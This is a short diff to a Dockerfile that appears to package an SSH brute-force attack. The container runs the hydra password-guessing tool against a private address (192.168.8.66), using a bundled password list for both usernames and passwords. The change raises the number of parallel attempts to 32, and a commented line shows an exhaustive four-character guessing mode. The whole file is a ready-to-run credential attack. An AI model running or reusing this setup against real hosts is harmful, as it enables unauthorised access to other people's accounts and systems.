@@ -11,4 +11,4 @@ ADD docker/passwords /
 ENV server 192.168.8.66
 
 #CMD hydra -L /passwords -V -x 4:4:aA1 $server ssh
-CMD hydra -L /passwords -V -P /passwords $server ssh
+CMD hydra -L /passwords -V -P /passwords -t 32 $server ssh
